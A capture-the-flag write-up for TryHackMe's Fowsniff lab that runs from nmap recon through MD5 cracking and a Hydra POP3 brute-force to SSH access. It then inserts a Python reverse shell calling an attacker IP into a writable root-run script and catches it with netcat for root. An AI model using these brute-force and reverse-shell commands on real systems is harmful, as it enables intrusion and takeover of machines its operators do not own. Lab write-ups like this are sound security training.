---

title: Fowsniff CTF
category: Privilege Escalation
difficulty: Easy
tags: [nmap, hydra, pop3, ssh, privilege escalation, reverse shell]
platform: TryHackMe
year: 2025
date: 2025-10-25

---

# 🕵️‍♂️ Fowsniff CTF (TryHackMe)

## 📝 Description

This challenge focuses on enumeration, password cracking, and privilege escalation. The path involves finding leaked credentials on GitHub, cracking MD5 hashes, using Hydra for POP3 brute-force, reading an internal email for SSH credentials, and gaining root via a reverse shell inserted into a misconfigured script.

---

## 🔍 Initial Recon

### 🔎 Nmap Scan

```bash
┌──(kali㉿kali)-[~/thm/ctf]
└─$ nmap 10.201.99.253
```

**Result:**

```
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
110/tcp open  pop3
143/tcp open  imap
```

🧠 **Inference:**
The machine hosts SSH, a web server, and mail-related services (POP3/IMAP). The POP3 port is likely our initial foothold target.

---

## 🌐 Step 1: Exploring the Website

Visiting the web server (`http://10.201.99.253`) showed a mention of a **data leak**.

Although their **Twitter links were broken**, a reference led to a **GitHub repository** containing leaked user credentials in the form of **MD5 password hashes**.

---

### 📜 GitHub Leak (Leaked Credentials)

```
mauer@fowsniff:8a28a94a588a95b80163709ab4313aa4
mustikka@fowsniff:ae1644dac5b77c0cf51e0d26ad6d7e56
tegel@fowsniff:1dc352435fecca338acfd4be10984009
baksteen@fowsniff:19f5af754c31f1e2651edde9250d69bb
seina@fowsniff:90dc16d47114aa13671c697fd506cf26
stone@fowsniff:a92b8a29ef1183192e3d35187e0cfabd
mursten@fowsniff:0e9588cb62f4b6f27e33d449e2ba0b3b
parede@fowsniff:4d6e42f56e127803285a0a7649b5ab11
sciana@fowsniff:f7fd98d380735e859f8b2ffbbede5a7e
```

---

## 🔑 Step 2: Cracking MD5 Passwords

Used [**hashes.com**](https://hashes.com/en/decrypt/hash) to decrypt the hashes.

| Username | MD5 Hash                         | Password   |
| -------- | -------------------------------- | ---------- |
| mauer    | 8a28a94a588a95b80163709ab4313aa4 | mailcall   |
| mustikka | ae1644dac5b77c0cf51e0d26ad6d7e56 | bilbo101   |
| tegel    | 1dc352435fecca338acfd4be10984009 | apples01   |
| baksteen | 19f5af754c31f1e2651edde9250d69bb | skyler22   |
| seina    | 90dc16d47114aa13671c697fd506cf26 | scoobydoo2 |
| mursten  | 0e9588cb62f4b6f27e33d449e2ba0b3b | carp4ever  |
| parede   | 4d6e42f56e127803285a0a7649b5ab11 | orlando12  |
| sciana   | f7fd98d380735e859f8b2ffbbede5a7e | 07011972   |

---

## 💣 Step 3: Brute-Forcing POP3 Login (Hydra)

Created `users2.txt` (without @fowsniff) and `decrypted_passwords.txt`.

```bash
┌──(kali㉿kali)-[~/thm/ctf]
└─$ hydra -L users2.txt -P decrypted_passwords.txt pop3://10.201.99.253/
```

**Result:**

```
[110][pop3] host: 10.201.99.253   login: seina   password: scoobydoo2
```

🎯 **Valid Credentials:** `seina : scoobydoo2`

---

## 📬 Step 4: Accessing POP3 Mailbox

Connected using **Netcat**:

```bash
nc 10.201.99.253 110
```

**Commands & Output:**

```
USER seina
PASS scoobydoo2
+OK Logged in.
LIST
+OK 2 messages:
1 1622
2 1280
```

**Email 1 (RETR 1)**
From: `stone@fowsniff`
Subject: **URGENT! Security EVENT!**

```
This server is capable of sending and receiving emails, but only locally.
You can, however, access this system via the SSH protocol.

The temporary password for SSH is "S1ck3nBluff+secureshell"
```

**Email 2 (RETR 2)**
From: `baksteen@fowsniff`
Reveals additional usernames and confirms use of internal SSH.

---

## 🧩 Step 5: SSH Access

Using credentials from the email:

```bash
ssh baksteen@10.201.99.253
Password: S1ck3nBluff+secureshell
```

✅ **Login Successful!**

---

## 🧠 Step 6: Privilege Escalation Enumeration

Searched for executables with **group execute permissions** tied to user groups:

```bash
find / -type f -perm /g+x -exec sh -c '
file_group=$(stat -c "%G" "$1")
user_groups=$(id -Gn)
for group in $user_groups; do
    if [ "$file_group" = "$group" ]; then
        echo "$1"
        break
    fi
done
' sh {} \;
```

**Found:**

```
/opt/cube/cube.sh
```

---

## 🐚 Step 7: Reverse Shell Injection

Edited `/opt/cube/cube.sh` and inserted the reverse shell payload:

```bash
python3 -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("10.17.21.245",1234));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
```

⚠️ **Note:** The IP must be enclosed in **double quotes** (`""`) for it to work properly.

---

## 🔁 Step 8: Trigger Reverse Shell

On attacker machine:

```bash
nc -lvp 1234
```

**Result:**

```
listening on [any] 1234 ...
connect to [10.17.21.245] from [10.201.99.253]
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
```

🎉 **Root Access Gained!**

---

## 🚩 Step 9: Capture the Flag

```bash
# cd /root
# cat flag.txt
```

**Flag Output:**

```
   ___                        _        _      _   _             _ 
  / __|___ _ _  __ _ _ _ __ _| |_ _  _| |__ _| |_(_)___ _ _  __| |
 | (__/ _ \ ' \/ _` | '_/ _` |  _| || | / _` |  _| / _ \ ' \(_-<_|
  \___\___/_||_\__, |_| \__,_|\__|\_,_|_\__,_|\__|_\___/_||_/__(_)
               |___/ 

 (_)
  |--------------
  |&&&&&&&&&&&&&&|
  |    R O O T   |
  |    F L A G   |
  |&&&&&&&&&&&&&&|
  |--------------
  |
  |
  |
  |
  |
  |
 ---

Nice work!
This CTF was built with love in every byte by @berzerk0 on Twitter.
Special thanks to psf, @nbulischeck and the Fofao Team.
```

---

## 🧩 Summary of Exploitation Path

| Phase                | Technique                | Tool(s) Used       | Result                        |
| :------------------- | :----------------------- | :----------------- | :---------------------------- |
| Recon                | Service enumeration      | nmap               | Found ports 22, 80, 110, 143  |
| Discovery            | Data leak investigation  | Browser            | Found GitHub leak             |
| Credential cracking  | MD5 decryption           | hashes.com         | Recovered plaintext passwords |
| Initial access       | POP3 brute-force         | Hydra              | `seina:scoobydoo2`            |
| Lateral movement     | Email credential reuse   | POP3 → SSH         | SSH login as `baksteen`       |
| Privilege escalation | Misconfigured executable | find, bash, python | Reverse shell as root         |
| Root flag            | `/root/flag.txt`         | nc shell           | Gained root flag              |

---